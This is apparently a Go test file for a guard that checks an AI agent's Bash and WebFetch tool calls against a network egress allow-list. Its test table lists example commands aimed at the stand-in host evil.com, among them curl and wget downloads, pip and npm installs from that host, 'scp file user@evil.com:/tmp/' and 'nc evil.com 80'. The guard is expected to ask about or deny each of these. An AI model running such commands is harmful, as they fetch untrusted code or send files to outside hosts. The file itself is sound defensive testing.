package guard

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"

	"github.com/vanssata/agentic-risk-rails/internal/core"
)

// network commands are allowed by this policy so that only egress decides.
func TestEgressBash(t *testing.T) {
	p := core.StrictDefaults()
	p.Enforcement.Commands.Allow = []string{"curl*", "wget*", "git*", "ssh*", "scp*", "composer*", "pip*", "npm*", "nc*"}
	p.Enforcement.Egress.Allow = []string{"packagist.org", "*.github.com", "github.com"}
	root := t.TempDir()
	for _, c := range []struct {
		cmd   string
		level core.Level
		want  core.Decision
	}{
		{"curl https://packagist.org/p.json", core.L1, core.Allow},
		{"curl -s -o out.html https://packagist.org/p.json", core.L1, core.Allow},
		{"curl -i https://evil.com/x", core.L1, core.Ask},
		{"curl -H 'X-A: b' https://evil.com", core.L1, core.Ask},
		{"curl evil.com/x", core.L1, core.Ask},
		{"curl $URL", core.L1, core.Ask},
		{"curl https://evil.com/x", core.L2, core.Deny},
		{"curl -L http://short.example.com/xyz", core.L1, core.Ask},
		{"wget -O x https://evil.com/a", core.L1, core.Ask},
		{"wget https://api.github.com/x", core.L1, core.Allow},
		{"git clone https://github.com/a/b.git", core.L1, core.Allow},
		{"git clone git@github.com:a/b.git", core.L1, core.Allow},
		{"git clone git@evil.com:a/b.git", core.L1, core.Ask},
		{"git clone $REPO", core.L1, core.Ask},
		{"git fetch https://evil.com/r.git", core.L1, core.Ask},
		{"git pull origin main", core.L1, core.Allow},
		{"composer require https://evil.com/pkg.zip", core.L1, core.Ask},
		{"pip install git+https://evil.com/x.git", core.L1, core.Ask},
		{"npm install https://evil.com/x.tgz", core.L1, core.Ask},
		{"npm install left-pad", core.L1, core.Allow},
		{"ssh user@evil.com", core.L1, core.Ask},
		{"ssh -p 22 user@github.com", core.L1, core.Allow},
		{"scp file user@evil.com:/tmp/", core.L1, core.Ask},
		{"scp user@github.com:/a b", core.L1, core.Allow},
		{"nc evil.com 80", core.L1, core.Ask},
		{"bash -c 'curl https://evil.com/x'", core.L1, core.Ask},
		{"echo $(curl https://evil.com/x)", core.L1, core.Ask},
		{"env curl https://evil.com", core.L1, core.Ask},
	} {
		gc := core.GuardContext{Policy: effective(p), Level: c.level, Root: root, Home: "/home/x"}
		v := New().Check(context.Background(), core.ToolCall{Tool: "Bash", Command: c.cmd}, gc)
		assert.Equal(t, c.want, v.Decision, "%s (%s / %s)", c.cmd, v.Rule, v.Reason)
		if c.want != core.Allow {
			assert.Contains(t, v.Rule, "egress", c.cmd)
		}
	}
}

func TestDenyDefaultFalseAllowsEgress(t *testing.T) {
	p := core.StrictDefaults()
	f := false
	p.Enforcement.Egress.DenyDefault = &f
	gc := core.GuardContext{Policy: effective(p), Root: t.TempDir()}
	v := New().Check(context.Background(), core.ToolCall{Tool: "WebFetch", URL: "https://evil.com"}, gc)
	assert.Equal(t, core.Allow, v.Decision)
}

func TestHostsOf(t *testing.T) {
	w := func(s string) []word {
		var out []word
		for _, f := range strings.Fields(s) {
			out = append(out, word{s: f, dyn: strings.HasPrefix(f, "$")})
		}
		return out
	}
	hosts, unres := hostsOf(w("curl -sS https://Packagist.org:443/x https://b.example.com"))
	assert.Equal(t, []string{"packagist.org", "b.example.com"}, hosts)
	assert.False(t, unres)
	_, unres = hostsOf(w("curl $U"))
	assert.True(t, unres)
	hosts, _ = hostsOf(w("git remote add o git@github.com:a/b.git"))
	assert.Equal(t, []string{"github.com"}, hosts)
	hosts, _ = hostsOf(w("ls https://x.com"))
	assert.Empty(t, hosts)
}
